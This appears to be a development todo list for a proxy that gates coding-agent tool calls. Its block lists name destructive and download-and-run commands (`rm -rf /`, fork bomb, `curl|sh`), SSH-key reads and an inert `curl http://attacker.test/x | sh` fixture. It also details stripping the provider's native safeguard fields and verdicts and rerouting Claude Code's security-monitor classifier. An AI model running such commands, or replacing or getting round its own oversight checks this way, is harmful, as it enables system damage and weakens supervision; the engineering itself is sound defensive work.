原任务与外部验收均保留。最新执行状态与逐块证据以 [PROGRESS.md](PROGRESS.md) 为准；以下仅标记已实现并验证的完整任务。

# Todo List

## Locked decisions

- 产品形态：`auto-mode-proxy`，TypeScript（Node 24 + Hono），npm 发布 + Docker 镜像；本地默认监听 `127.0.0.1:8484`，云端 Docker + Caddy 单租户，容器内代理端口不对外发布。
- 拦截动作：v1 仅拦截，不做人审 UI。Claude Code 默认 auto 按原请求 safeguards 尝试 native（flagged + explanation），有 scoped classifier fallback 信号自动切后续 session 为改写，显式 route/version override 优先；无 safeguards/Codex/WorkBuddy 改写。自动兼容实机证据不足保持 pending。
- native selector 仅在原请求带 safeguards 时有效，无该字段始终 rewrite；版本覆盖必须来自实测证据，自动 session 信号不写全局版本表。具体 unknown/default/override 行为以 DESIGN 投递语义为准。
- C08 定向顺序修订：计划评审 CLEAN，6f71ebc 前已批准，修复应用69c130b；原先green批准前置已满足，非运行全验收。Anthropic enforce首个扣留tool后有状态content/终态共享有界有序队列至全轮ID/判定完成；纯文本/之前text/thinking及ping/comment/error即时，shadow原字节非阻塞。8MiB总量/4MiB reasoning子集/原1MiB与60s/30s/60s及取消规则不变。P3-2/3/7checked；P3-1native严格FAIL/combinedorderedunchecked，P3-4fullunchecked/localcomplete，P3-5externalrealkeys/endpointmissing/P3-6trueC10C11dependency retained。**C08本地关闭**(两项最终correctionreviewCLEAN2339ec7)，不是原生/组合/所有sourceexternal验收完成；父代理先顺序提交本次closuretracker commit，再启动C09。
- 协议范围：Anthropic Messages（Claude Code）、OpenAI Responses（Codex）、OpenAI Chat Completions（WorkBuddy），按此顺序分阶段交付。
- 决策后端：System One adapter（TypeSafe 原生 / OpenRouter / Vercel / Cloudflare Clef）、OpenAI Decisions adapter（Vercel / OpenAI 原生）、灰区 LLM 二审（Anthropic Messages 格式，默认 `anthropic/claude-haiku-5.5`）。提供方按配置顺序 failover，全部失败 fail-closed（可配 fail-open）。
- Classifier 改道：v1 只改道 Claude Code 客户端 classifier 请求（指纹：`system` 中有以 `You are a security monitor for autonomous AI coding agents` 开头的块且无 `tools`）到可信 Anthropic 兼容 provider；Codex / WorkBuddy 改道不在 v1。
- 凭证：vault 为主（代理持中转站 key，agent 用 `amp_` 前缀 token）；passthrough 仅在 loopback 监听时允许。
- 策略：硬拒绝 → 敏感路径（含读取）→ 非敏感只读/管理豁免与泛化 `Action.kind=other`（含显式 `tool_map: other`）直接 allow → 灰区六个正向 noul 问题。保留原 P2-1/P2-7 other 语义；有 command/path 或不可解析执行输入先归一为相应待审动作，不误落 other，不可用执行上下文 block。Task/TodoWrite 豁免保留。敏感读优先落实原 P2-3 `cat ~/.ssh/id_rsa` review 验收，不等于未知工具一律 review。残余风险：隐藏能力的未知/误映射 other 可绕过决策模型，Task 不可见委派不受覆盖，后续可见调用仍过闸门。阈值 任一风险项 ≥ 0.70 拦截；`matches_user_request` ≤ 0.30 且任一风险项 ≥ 0.50 拦截；四项 ≤ 0.30 且 `outside_scope` ≤ 0.50 放行，其余二审。
- 状态与存储：配置 YAML（`~/.config/auto-mode-proxy/config.yaml`，`${ENV}` 插值），审计 JSONL（`~/.local/state/auto-mode-proxy/audit.jsonl`），判定缓存内存 LRU（TTL 600 s），无数据库。
- 工程：npm、vitest、tsup、tsx、zod、pino、eventsource-parser、shell-quote、partial-json；MIT；README 英文 + `README.zh-CN.md`；实现期经验追加到仓库根 `AGENTS.md` 的 Lessons。

## Implementation tasks

### Phase 0：脚手架

- [x] P0-1 初始化仓库与工具链
  - 创建 `package.json`（`"type":"module"`，`engines.node >=24`，bin `auto-mode-proxy` → `dist/cli/index.js`，scripts：`dev`、`build`、`test`、`typecheck`、`lint`、`eval`）、`tsconfig.json`（ES2024、NodeNext、strict）、`tsup.config.ts`、`vitest.config.ts`、`.gitignore`、`LICENSE`（MIT）、`.editorconfig`。依赖：`hono`、`@hono/node-server`、`zod`、`yaml`、`pino`、`eventsource-parser`、`shell-quote`、`partial-json`、`commander`、`@inquirer/prompts`；dev：`typescript`、`tsx`、`tsup`、`vitest`、`@types/node`、`@types/shell-quote`、`eslint` + typescript-eslint。安装时取当前稳定版并把版本与 eventsource-parser v3 的 `createParser({ onEvent })` 用法记入 `AGENTS.md` Lessons。
  - 位置：仓库根目录。
  - 完成标准：`npm run typecheck`、`npm test`（空测试）、`npm run build` 均通过；`node dist/cli/index.js --version` 输出版本。
  - C01 parent-reported verification (2026-10-28, local no-secret bootstrap): `npm ci`, `npm run typecheck`, `npm run lint`, `npm test` (explicit bootstrap empty suite), `npm run build`, `node dist/cli/index.js --version` (`0.1.0`) and `node dist/cli/index.js --help` all exit 0. Actual pins: TypeScript 5.9.3, eventsource-parser 3.1.1, tsup 8.5.0 (replaces initial 9.0.0 after published declaration defects); Node `^24.11.0 || >=26.0.0`.
  - C01 CLOSED at `1ed739a`: post-fix gates all passed, security and final accounting reviews CLEAN; version/help implemented, later CLI commands remain in scope.
  - Historical C01 boundary: `eval` was staged/unavailable until C12, not counted as a working bootstrap script. C12 now registers the real implementation; actual source and built `eval --validate` both exited 0 in parent verification. This is command reachability/schema evidence, not a passing accuracy metric or packed-tarball acceptance. C02 removed bootstrap `--passWithNoTests` when tests were introduced.

- [x] P0-2 配置 schema 与加载器
  - 用 zod 定义 `Config`：`listen{host,port}`、`auth{mode:"vault"|"passthrough", client_tokens[]}`、`routes[]{prefix, protocol:"anthropic-messages"|"openai-responses"|"openai-chat", upstream, project_dirs[]?, tool_map?}`、`upstreams{<id>:{base_url, api_key?, auth_header:"authorization"|"x-api-key"|"both", forward_safeguards:false, extra_headers?}}`、`gate{mode:"enforce"|"shadow", on_provider_failure:"block"|"allow", hold_keepalive_ms:5000, provider_timeout_ms:5000}`、`decision{chain[], providers{<id>:{kind:"systemone"|"openai-decisions", base_url, api_key, model, headers?, envelope?:"none"|"cloudflare", body_extra?}}, second_stage?{kind:"anthropic-messages", base_url, api_key, model, pin?}}`、`classifier_reroute{enabled, provider, model_map?}`、`audit{path, redact:true}`、`policy{thresholds, readonly_allow_extra[], hard_deny_extra[], sensitive_paths_extra[]}`、`log_level`。实现 `${ENV}` 插值（缺失变量报错并指出键路径）、默认值、`passthrough` 且非 loopback 监听时报错。
  - 投递补充 schema：`routes[].claude_delivery:"auto"|"native"|"rewrite"`（默认 auto），`routes[].claude_delivery_by_version?:{<exact-version>:"native"|"rewrite"}`（route 显式非 auto 优先，其次精确版本覆盖，其次 scoped auto）。未知版本按原请求有无 safeguards 选择 native/rewrite；实际 session/version 提取只采用已观测可信客户端请求元数据，缺失不猜。自动 fallback 关联/30 s 窗口/1024 session/30 min TTL 见 DESIGN。P3-5 的 conditional `upstreams[].strip_beta?:boolean` 与现有布尔 `forward_safeguards` 独立，默认 true（不是把布尔改对象）；验证不剥 beta 可用后才接入 false 分支。
  - 位置：`src/config/schema.ts`、`src/config/load.ts`、`src/config/defaults.ts`、`deploy/config.example.yaml`。
  - 完成标准：对 `config.example.yaml` 加载成功；三个负例（缺变量、passthrough+0.0.0.0、未知 protocol）给出含键路径的错误；单测覆盖。
  - C02 parent verification: typecheck/lint/test/build exit 0, 81 tests passed. Direct loader smoke loaded the example with disposable per-variable values and all three routes/providers; missing variable error includes `auth.client_tokens[0]`. Bootstrap empty-suite allowance removed. Independent C02 review underway.

- [x] P0-3 CLI 骨架
  - commander 子命令：`init`（交互生成配置、签发 token、打印三种 agent 接入片段）、`serve [--config] [--log-level]`、`check`（校验配置并向每个决策提供方发送固定 canary 问题，打印延迟与结果）、`eval`、`audit tail [-n]`、`token new`。`token new` 生成 `amp_` + 32 字节 base64url。
  - 位置：`src/cli/index.ts`、`src/cli/{init,serve,check,eval,audit,token}.ts`。
  - 完成标准：`auto-mode-proxy init` 在临时目录生成可被 P0-2 加载的配置；`check` 对 mock provider 返回成功；`token new` 输出符合格式。
  - Local command-set completion: version/help/init/token/real built serve, C07 real `check` against loopback mock, built `audit tail`, and C12 real registered eval are parent-verified. C12 `npm run eval -- --validate` and `node dist/cli/index.js eval --validate` both exited 0 (150 rows, ten categories, both labels, three templates; no provider calls). This validation preceded a label-preserving CI-YAML fixture correction, so it does not certify the corrected corpus digest or any accuracy threshold. P2-8's credential-boundary defect was separately repaired and verified in C07; the C12 private fake-credential built-tail proof also redacted literals. Full P7 provider/injection acceptance remains separate and unchecked.

### Phase 1：直通代理与 Anthropic Messages 适配器

- [x] P1-1 Hono 应用、路由解析与健康端点
  - 应用工厂 `createApp(config)`；按最长 `prefix` 匹配 route，剥去 prefix 后得到上游路径；无前缀时按路径推断协议（`/v1/messages*`、`/v1/responses`、`/v1/chat/completions`）；未知路径对该 route 的 upstream 字节级直通（含 `HEAD /api/hello`、`GET /v1/models`、`POST /v1/messages/count_tokens`）。`GET /healthz` 返回 200；`GET /_amp/status` 返回版本、运行时长、路由、提供方健康、allow/block/uncertain 计数（仅 loopback 或带管理 token 时可访问）。
  - 位置：`src/server/app.ts`、`src/server/router.ts`、`src/server/status.ts`。
  - 完成标准：单测覆盖前缀匹配与协议推断；未知路径直通测试通过。

- [x] P1-2 认证与凭证替换
  - vault：从 `Authorization: Bearer` 或 `x-api-key` 取客户端 token，`timingSafeEqual` 比较；转发时按 upstream 的 `auth_header` 设置凭证，移除客户端凭证头。passthrough：原样转发凭证，仅当 `listen.host` 为 loopback 时允许启动。
  - 位置：`src/server/auth.ts`。
  - 完成标准：错误 token 返回 401（Anthropic 风格错误体 `{type:"error", error:{type:"authentication_error", message}}`）；单测覆盖两种模式与两种头。

- [x] P1-3 上游转发层
  - 用 Node 内置 `fetch` 转发：过滤 hop-by-hop 头（connection、keep-alive、transfer-encoding、te、trailer、upgrade、proxy-*、host、content-length），请求上游时加 `Accept-Encoding: identity`；保留 `anthropic-version`、`anthropic-beta`、`x-claude-code-*`、`x-codex-*` 等全部其他头；响应头原样回传（含 `retry-after`、限流头），错误体不改写；客户端断开时 `AbortController` 中止上游；上游超时与连接错误返回 502/504 并记录。请求体仅解析不修改时按原字节转发。
  - 位置：`src/server/upstream.ts`、`src/server/errors.ts`。
  - 完成标准：集成测试证明非流式 JSON 与 SSE 响应逐事件透传（无缓冲，首事件延迟 < 50 ms），客户端断开后上游请求被中止。
  - C04 parent gates passed: typecheck/lint/test/build, 196 tests. Built serve launched against actual disposable loopback relay: health200, unauthorized401, authorized200, vault key replaced, `/v1/models` path and retry-after3 preserved; SIGTERM shutdown observed. Server suite covers first SSE event <50ms and disconnect cancellation. Independent review underway; this stage is explicitly unprotected transparent transport until gate integration.

- [x] P1-4 SSE 通用工具
  - 基于原始 frame 扫描 + eventsource-parser 语义解析的 TransformStream；保存 comment/CRLF/id/retry/多行 data 与未知事件原始字节，仅真正修改的事件重编码，不用 parse/reencode 冒充字节保真。处理跨 chunk 半行、背压/取消，并提供 pingKeepalive(intervalMs, format)。遵守响应缓冲/截止硬界限。
  - 位置：`src/protocols/sse.ts`。
  - 完成标准：fixture 回放逐字节一致（除保活）；分片边界测试通过。

- [ ] P1-5 Anthropic Messages 适配器（直通阶段）
  - 请求提取 model/system/tools/messages/safeguards/stream、classifier_context 和最后用户文本。tool_use start→stop 缓冲完整 input_json_delta；完整 JSON.parse 才能作为可审批动作，partial-json 仅诊断，不完整标 unparseable 并 fail-closed。纯文本/首个扣留 tool 前文本与 thinking 直通；enforce 后缀按 DESIGN 有序内容屏障（compat stripping 另列），ping/error 保持即时。此未保护阶段仅对完整 fixture 调用显式 allow，禁止真实 agent 流量；非流式完整提取 content[].tool_use。受响应硬界限约束，C08 替换真实 gate。
  - 位置：`src/protocols/anthropic/{adapter,stream,nonstream}.ts`、`src/protocols/types.ts`（`ToolCall{id,name,input,raw}`、`ProtocolAdapter` 接口）。
  - 完成标准：fixture（纯文本、thinking、单 tool_use、并行多 tool_use、ping、error 事件、eager 流式的不完整 JSON）单测通过；真实 Claude Code 经代理两轮对话后第二轮 `usage.cache_read_input_tokens > 0`。
  - C05 local implementation verified: parent full gates passed274tests; raw SSE fragmentation/bounds/EOF/cancellation and Anthropic fixtures passed. Actual HTTP smoke observed text before delayed tool and byte-exact output. Required real Claude second-turn cache evidence not yet exercised, so full P1-5 remains unchecked. Independent chunk review underway.

### Phase 2：闸门引擎与 System One 适配器

- [x] P2-1 动作归一化
  - 定义 `Action{kind:"command"|"file_write"|"url"|"mcp"|"other", tool, argv?, text?, paths[], content_excerpt?, content_truncated:boolean, recognized_exemption?, workdir?, raw}`。Claude Code：Bash→command；Write/Edit/MultiEdit/NotebookEdit→file_write，提取 file_path/notebook_path，UTF-8 完整内容 ≤2 KiB 才可送审，超出保留 excerpt + truncated 标记并直接 block；WebFetch/WebSearch→url；mcp__*→mcp；Read/Glob/Grep/LS→other 但必须保留路径，敏感或上下文不足不能认作非敏感豁免；TodoWrite/Task 保留豁免，Task 委派执行为显式残余风险、所有后续可见调用仍过闸门。Codex：exec_command/shell/shell_command→command（字符串/数组 cmd）；local_shell_call→action.command[]；write_stdin→chars（无法关联会话则 review/block）；sandbox_permissions/justification 仅审计；apply_patch→file_write，解析 Add/Update/Delete File 路径、Delete 为 destructive 候选。WorkBuddy tool_map 优先，其次名称/描述 shell|bash|command|terminal|exec|run + command|cmd|script 字符串判 command，path+content 判 file_write；可见 command/path 或不可解析执行输入归一为相应待审动作，不能因未知工具名或 other 映射被抹掉，缺失可用执行上下文则 block。其余泛化 other 及显式 tool_map other 保留原直接 allow；隐藏能力或映射错误可能逃过识别是已记录残余风险，不改成一律 review。
  - 位置：`src/gate/types.ts`、`src/gate/normalize/{index,claude-code,codex,workbuddy,apply-patch}.ts`。
  - 完成标准：表驱动单测覆盖每种工具与边界（数组 cmd、空输入、patch 多文件）、泛化 other/显式 tool_map other 直接 allow、可见 command/path 与不可解析执行输入不误落 other、敏感读不因 other 豁免。
  - Review corrections implemented and parent-verified: malformed recognizable paths unavailable, supported patch grammar validated. Full1097test gates and inert API smoke passed; independent correction review underway.
  - **C12 USER-APPROVED supersession (2026-10-29, implementation pending):** content-bearing native reads no longer inherit generic-other/read exemptions. Exact known read names, declaration hints, all-protocol/string-JSON handling, precedence and unchanged genuine-other/Task/Todo residual risks are frozen in DESIGN §“C12 targeted USER-APPROVED amendment”; implement in existing normalizers without new Action/config kinds. Earlier checked P2-1 is historical local evidence, not proof of this pending semantic change.

- [x] P2-2 策略常量模块
  - 单一文件集中：`POLICY_VERSION`、六个 noul 问题的 `instructions` 与 `criteria.true/false` 初稿（`destructive`、`exfiltration`、`remote_code_exec`、`security_weakening`、`outside_scope`、`matches_user_request`，正向措辞、一题一条件、false 侧写具体情形）、阈值常量（0.70 / 0.30 / 0.50）、只读程序集合、硬拒绝正则、敏感路径 glob、脱敏正则。所有值可被 `config.policy.*` 追加或覆盖。
  - 位置：`src/policy/constants.ts`。
  - 完成标准：模块无逻辑只含数据；`docs/tuning.md` 引用该文件作为唯一调参入口。
  - Full constants-backed effective-policy overrides and current consumers implemented; strict RegexSpec/questions/caps schema, shared DEFAULT_POLICY/resolvePolicy, replacement-plus-extra semantics tested through actual consumers. Parent full1097test gates and override smoke passed; independent correction review underway.

- [x] P2-3 Shell 解析与确定性规则
  - `shell-parse.ts`：用 `shell-quote` 分词，按 `|`、`;`、`&&`、`||` 切段，检测重定向、`$()`/反引号、`eval`、`sudo`、`xargs`、`sh -c`/`bash -c`、`env`/`nohup` 前缀、base64 解码后执行。`readonly-allowlist.ts`：仅当所有段的程序在只读集合且无上述构造且 `find` 无 `-delete/-exec`、`git` 子命令在只读子集时返回 allow。`hard-deny.ts`：`rm -rf /`、`rm -rf ~`、`mkfs`、`dd of=/dev/*`、fork bomb、`chmod -R 777 /`、写 `~/.ssh/authorized_keys`、`curl|sh`、`wget|bash` 等。`sensitive-paths.ts`：项目目录外写入、`.claude/settings*`、`.claude/hooks`、`.codex/`、`.git/hooks/*`、`.github/workflows/*`、`package.json`、`.env*`、`*.pem`、`*.key` 命中返回 review。`redact.ts`：API key、Bearer token、密码参数、PEM 块、连接串替换为 `[REDACTED:<type>]`。
  - 敏感检查必须在任何 shell/原生只读豁免之前；敏感读取包括 `.env*`、`~/.ssh/id_*`、`*.pem`、`*.key`。新增 shell/native Read/Grep/Glob 对应回归，路径或解析上下文不足不可认作已确认非敏感。
  - 位置：`src/policy/{shell-parse,readonly-allowlist,hard-deny,sensitive-paths,redact}.ts`。
  - 完成标准：每个模块表驱动测试 ≥ 30 条用例；`ls | rm -rf x` 不被白名单放行；`cat ~/.ssh/id_rsa` 进入 review。
  - All recorded review defect families reproduced before fixes then parent-verified: Git helpers/wrapper assignments, Windows aliases/recursive scopes, embedded refresh/client credentials. Full1097test gates and direct inert API smoke passed; independent correction review underway.

  - **C12 USER-APPROVED supersession:** `content_reads = A：读取内容先审批`. Nonmutation plus lexical-sensitive-glob nonmatch is not authorization. All known shell content-read programs and native Read/Grep/read-capability tools must reach trusted review; conservative existing metadata-only candidates retain fast paths ONLY after structural/hard-deny/sensitive checks. Do not special-case `cat`/customer path, introduce public-directory allowlist (option B not chosen), approve by user-intent regex, whitelist builds/writes, or broaden unknown-other policy. Parser substitutions/redirection/nested execution stay nonexempt. Exact program/name/hint table and regressions: DESIGN amendment / PROGRESS C12 handoff. Bump POLICY_VERSION `c06.1`→`c12.1`; pure-text performance unchanged, read approval latency/cost explicitly accepted.
  - TR-01 metadata correction: `type`/`which` are content-capable and nonexempt (definitions/Windows content); `du`/`find` metadata controls must additionally exclude content-input `--files0-from`/`-files0-from` separate/equal/known applicable forms via existing parsed tokens/argument checks, independently of sensitive recursion. Require inert negatives and ordinary metadata positives; no second parser, file inspection, command trials or new config.

- [x] P2-4 决策 state 构造
  - `buildState(action, ctx)` 返回对象 `{action:{tool, command|path+content_excerpt|url, workdir}, environment:{platform, project_dir, trusted_directories, git_branch?}, user_request}`。`user_request` 取最后一条用户文本（Anthropic：最后一个 role=user 的 text 块；Responses：最后一个 user message 的 `input_text`；Chat：最后一条 user content），截断 1000 字符。绝不包含助手文本、tool_result、Codex `justification`。
  - 写 state 增加 `content_truncated`；截断写 fail-closed，不允许完整内容摘要替代模型未见内容；危险后缀位于字节 2048 之后的 fixture 必须 block（即使 provider 返回安全或配置 fail-open）。
  - 位置：`src/policy/state-builder.ts`。
  - 完成标准：单测断言三种协议的提取与截断，以及排除项不出现。
  - Actual encoded Anthropic/Responses string+array/Chat extraction through buildState implemented and tested, latest empty/result-only user preserved, redaction/exclusions/caps verified. Parent pre-fix targeted suites218failures (`artifact://111`) then corrected full1097tests passed; direct raw3protocol smoke passed. Independent correction review underway.

- [ ] P2-5 System One 决策适配器
  - 实现 `DecisionProvider` 接口 `decide(state, questions) → Answers{[id]: probability}`。请求 `{model, state, questions}`；鉴权 `Authorization: Bearer`；支持 `headers` 追加（Cloudflare `cf-aig-gateway-id`）；`envelope:"cloudflare"` 时解包 `{result, success, errors}`；超时取 `gate.provider_timeout_ms`；429/529 重试一次（遵守 `retry-after`）；记录 `usage.input_tokens` 与成本估算（按 provider 配置单价，默认 Jev $0.042/M）。
  - 位置：`src/decision/{types,systemone,http}.ts`。
  - 完成标准：mock HTTP 单测覆盖四种 URL 形态、信封解包、超时、重试；`check` 命令对真实 provider 成功。
  - C07 local adapter/check verified with full1331test gates and actual built check against loopback provider. Full task remains unchecked: real-provider canary blocked by absent configured provider keys/default config; exact observed prerequisites in PROGRESS/docs/compat.

- [ ] P2-6 调查：OpenRouter 与 Cloudflare 的请求细节
  - 对 `https://openrouter.ai/api/v1/systemone` 分别用 `typesafe/jev-1.14` 与 `jev-latest` 发 canary；若 `/systemone` 两者都拒绝，则 OpenRouter provider 改为 `kind:"systemone"` + `base_url: https://openrouter.ai/api/alpha/decisions`（同 schema，允许 `body_extra.provider`）。对 Cloudflare REST 发 canary：若响应为 `{result,...}` 信封则默认 `envelope:"cloudflare"`，若直接返回 System One 响应则 `envelope` 自动探测（存在 `answers` 顶层即视为无信封）。
  - 位置：结论写入 `docs/compat.md` 与 `deploy/config.example.yaml` 注释。
  - 完成标准：两家 provider 的 `check` 均返回有效概率；文档记录实测模型 ID 与端点。
  - [blocked] Both real canary investigations require provisioned OpenRouter key and Cloudflare token/account/endpoint. Safe presence probes found those environment values and active config absent. No accepted model/path/envelope is fabricated; mock support implemented and verified separately.

- [x] P2-7 判定管线与缓存
  - `decide(action, ctx) → Verdict{outcome:"allow"|"block"|"uncertain", reasons[], probabilities?, provider?, rule?, latency_ms, cost_usd}`：截断/不可用执行动作安全检查 → 硬拒绝 → 敏感路径标记 → 非敏感只读/管理豁免及泛化 other 直接 allow → 缓存 → 决策链 → 阈值。敏感标记跳过豁免而进入 review；真正泛化 other（含显式 tool_map other）保留原直接 allow，不以未知名称或无执行语义上下文本身为 block 理由；可见 command/path 与不可解析执行输入由 P2-1 先归一为相应待审动作。P4-3 前 uncertain 一律 block；P4-3 后二审确实不可用才应用 on_provider_failure。缓存保留 action/POLICY_VERSION/chain IDs、TTL 600 s/LRU 10000，并加入完整本地内容摘要、有效脱敏 state、policy/provider/二审配置和模式/故障策略隔离；不缓存故障 allow，原始凭证不进键或日志。
  - 位置：`src/gate/decide.ts`、`src/gate/cache.ts`、`src/decision/chain.ts`。
  - Pending C12 amendment narrows only known content-read exemptions before generic-other; reuse `deterministicOutcome` for live enforcement and evaluator, with `'read'/'grep'` capability markers unable to bypass through `kind:other`. Cache identity/version invalidation and sensitive-first/unavailable barriers remain. Historical P2-7 local completion does not certify new source or metrics.
  - 完成标准：单测覆盖每条分支、failover、缓存命中、fail-closed/fail-open。
  - Historical C07 full1331test gates and actual gate/cache smoke passed; independent provider/transport and gate/cache/chain reviews (`agent://c07-review-1`, `agent://c07-review-2`) CLEAN. P2-7 local acceptance retained; no HTTP tool-use gate installation or live-provider acceptance claimed.

- [x] P2-8 审计日志
  - JSONL 追加写（异步、失败不影响请求）；记录 `ts, route, protocol, agent_hint(user-agent/x-claude-code-request-class), session_id(x-claude-code-session-id 或 x-codex-* 或无), tool, action(脱敏), rule, provider, probabilities, verdict, delivery("safeguard"|"rewrite"|"shadow"|"passthrough"), latency_ms, cost_usd, policy_version`；`audit tail` 命令按行格式化输出。
  - 位置：`src/audit/{logger,record}.ts`、`src/cli/audit.ts`。
  - 完成标准：集成测试后文件可被逐行 `JSON.parse`；grep 不到任何 token/key 明文。
  - Historical pre-correction evidence only: C07 parent typecheck/lint/test/build passed1331tests with maxWorkers2. Actual pipeline smoke exercised built check on mock, model allow then cache allow, harddeny block,2total provider calls including canary,3JSONL audit records with configured secrets absent in that sample, and built audit tail returning a parseable block record. It did not cover a credential crossing the excerpt boundary and cannot establish current P2-8 acceptance. No live provider/HTTP-gate acceptance claimed.
  - Audit source review `agent://c07-review-3` found the exact partial-credential boundary defect: normalization truncates `action.content_excerpt` at 2048 UTF-8 bytes before whole-literal configured-credential redaction. A credential straddling that boundary can leave all but its last character in the excerpt of a 2049-byte write; full-literal redaction of `action.raw` and historical tail cannot remove that unmatched prefix, even when the write is blocked.
  - Correction implemented: shared audit sanitizer recursively omits unsafe already-truncated excerpts in writer/currenttail/historicaltail, preserving digest/truncated/block metadata. Parent reproduced2fails/5leakassertions (`artifact://172`) then same2regressions passed; full1333test gates passed. Direct normalized2049-byte boundary Write->realJSONL->built audit tail smoke blocked, omittedexcerpt, retainedtruncatedflag and leakednoprefix. Independent correction review underway; CLI current-accounting issue corrected.

### Phase 3：Claude Code 投递与改道

- [ ] P3-1 `safeguards` 处理与 `safeguard_results` 注入
  - 请求带 `safeguards` 且 `gate.mode=enforce`：按 upstream `forward_safeguards=false` 剥除字段，并从 `anthropic-beta` 删除 `dangerous-tool-use-2026-09-03`；重新序列化 body。响应流：丢弃上游 `message_delta.delta.safeguard_results`；扣留最后的 `message_delta` 与 `message_stop` 直到所有 `tool_use` 判定完成（期间每 `hold_keepalive_ms` 发送 ping）；注入 `safeguard_results: [{type:"dangerous_tool_use", status:{type:"available", tool_uses:{<id>:{type:"evaluated", outcome:"not_flagged"} | {type:"evaluated", outcome:"flagged", explanation}}}}]`，无 tool_use 时注入空 `tool_uses`。`explanation` 格式：`[auto-mode-proxy] <rule 或 问题名=概率…>`；提供方全挂且 fail-closed 时 `flagged` + `decision providers unavailable`。非流式响应在顶层注入。`shadow` 模式：不剥字段、不丢上游结果，只记录假设判定。
  - enforce 无论 forward_safeguards true/false 均丢弃上游结果；重复 tool_use ID 整轮 fail-closed/取消上游，native 也扣留执行块至全轮 ID 唯一性确认。按 DESIGN 的 auto/route/version selector 选择投递；被自动 fallback 或覆盖为 rewrite 的带 safeguards 请求走 P3-2，不继续注入 native。
  - 位置：`src/protocols/anthropic/{adapter,stream,nonstream}.ts`。
  - 完成标准：fixture 单测断言注入位置、ID 映射、ping 保活、shadow 直通；集成测试中 mock 中转站返回的 `not_flagged` 被替换为代理的 `flagged`。
  - 新增本地验收：duplicate IDs 混合 verdict 无执行事件泄露；forward_safeguards=true 的伪造 not_flagged 仍被移除；fallback classifier 的 token/route/session/version 关联、误关联隔离、过期及 override 优先级。
  - Current GREEN DRAFT: repaired proxy wire tool0→text1 is correctall3, but actualClaude2.1.311 immediately replays marker-before-toolall3 and thirdown73char error omitscaptured181charreason. Definitive externalnativeclient compatibility blocker, strictcriteria/assertions remainFAIL, noexecutionbypass orspecificescalation inferred. Full1606G/targeted164/corebudgetCLEAN/actual328+335 PASS satisfy shared local repair gates, notnative strict. P3-1 remainsunchecked; independent P3-2 rewrite completion does not close native/combinedvalidation/C08.

- [x] P3-2 Anthropic 改写模式
  - 请求无 safeguards 或 selector 选 rewrite 时：拦截 tool_use 替换同 index 的 text（start→text_delta→stop），说明工具名/规则或概率/手动执行建议；无剩余 tool_use 则 stop_reason 改 end_turn。非流式同步 content[]/stop_reason；重复 ID/资源或解析错误不发执行事件。
  - 位置：`src/protocols/anthropic/{stream,nonstream}.ts`。
  - 完成标准：fixture 单测覆盖单块、多块中拦一块、全部拦截三种情形。
  - Independently VERIFIED under C08DraftAccountingReview: approved repair preserves denial0→marker1 and immediateactual2.1.311history; strictrewriteall3 PASS/no deliveredtools/results. Full1606G/targeted164/independentcorebudgetCLEAN/actual328+335/local319 PASS and actual349 routeAUTO+exact2.1.311rewrite genuineoptinhit1 satisfy P3-2's own rewrite criteria. Shared repair/gates apply to both modes, but native-specific strict criteria belong to P3-1 and remainFAIL/unchecked. This checkbox closes ONLY P3-2, not P3-1/P3-4/5/7, combinedorderedvalidation orC08. Noindexremap/historyrepair/assertionrelaxation.

- [x] P3-3 Classifier 请求改道
  - 指纹：`system` 数组中任一 text 块以 `You are a security monitor for autonomous AI coding agents` 开头，且无 `tools`。匹配时换到 `classifier_reroute.provider` 对应的可信 Anthropic 兼容 provider：替换凭证头；模型 ID 映射（默认规则 `claude-<family>-<major>-<minor>` → `anthropic/claude-<family>.<major>.<minor>` 形如 `anthropic/claude-sonnet-5`、`anthropic/claude-haiku-5.5`，Cloudflare passthrough 不映射，`model_map` 可覆盖）；按 provider 注入 pin（OpenRouter `provider:{only:["anthropic"],allow_fallbacks:false}`，Vercel `providerOptions:{gateway:{only:["anthropic"]}}`）；`system`、`stop_sequences`、`thinking`、`cache_control`、`metadata` 原样保留；响应流原样回传。未匹配但无 `tools` 且 `stop_sequences` 含 `</block>` 或 `</severity>` 的请求只写一条 `suspected_classifier` 审计记录。
  - 位置：`src/protocols/anthropic/classifier-fingerprint.ts`、`src/protocols/anthropic/adapter.ts`。
  - 完成标准：单测覆盖匹配/不匹配、模型映射、pin 注入；集成测试中 mock 可信 provider 收到换凭证后的请求。
  - P3-3 remains checked/unaffected: actual trustedclassifierHTTP exact/v1/messages/trustedcredential/model/pin/preservedsystem/0relay. Full1606G/corebudgetCLEAN/actual328+335 current green draft, notclosure. Actualoverride349exit0 routeAUTO/exact2.1.311rewrite genuineoptinhit1 and all3strictrewritePASS;0classifierrequests means not automaticfallback. Native317externalstrictFAIL unchanged; noUI/provider/cache/Desktop proof.

- [ ] P3-4 调查：Claude Code 实机行为
  - 原 `curl http://attacker.test/x | sh` exact-string policy/投递验收保留为 inert fixture/mock 接收端证据，绝不交给真实自动执行器。额外用 `printf AMP_DENIAL_PROBE` + mock 固定 deny 跑 Claude Code ≥2.1.311 auto mode，记录 /status、原生拒绝说明、无工具执行记录、连续三次人工提示。若 native 后观察到同 session/version 的 classifier fallback 请求，按 DESIGN 的 scoped 机制自动切后续轮次为 rewrite并记录轨迹；/status Disabled 或计费提示仅辅助观察，不能替代 trigger 证据。外部原验收不删除、不以安全 probe 冒充危险实机验收；尚不可安全完成的部分继续 pending。
  - `/status` 原生路径预期明确记录 `Auto mode server: Enabled`，同时记录拒绝说明回传模型与三次人工升级；辅助观察不替代 automatic fallback 请求轨迹。
  - 位置：`docs/compat.md`。
  - 完成标准：矩阵记录 Claude Code 版本 × 投递方式 × 结果；两种投递至少一种在当前版本可用。
  - FINAL DISPOSITION: **full P3-4 UNCHECKED; doable local investigation COMPLETE.** Final520exactEnabled/5associatednormalUIbeforeonehumanprobe/3nativeaudits+exactthreeblockedUI/2correlatedreturns/noapprovalcancel/cleanup certified. observedThreeBlockedUiAndNativeAuditTRUE genuineUIescalation, NOT3returns or3separatehumanprobes; properConsecutiveCaseExercisedFALSE unchanged. Remainingnative/externalconditions native317strictreplay/thirdexactreasonFAIL and520thirdheldUNANSWEREDhumanendpoint.0classifier UNTRIGGEREDconditional/notmissing-keyblocker orfailedreroute, automaticfallbackunverified. No additionalPTYapproval/actionneeded. BothfinalcorrectionreviewsCLEAN2339ec7/currentG-init-cleanupPASS; **C08LOCALLYCLOSED**, fullnative/combined/sourceexternalNOTaccepted, parentclosuretrackercommitbeforeC09.

- [ ] P3-5 调查：改写模式的 preserved thinking 与 beta 头
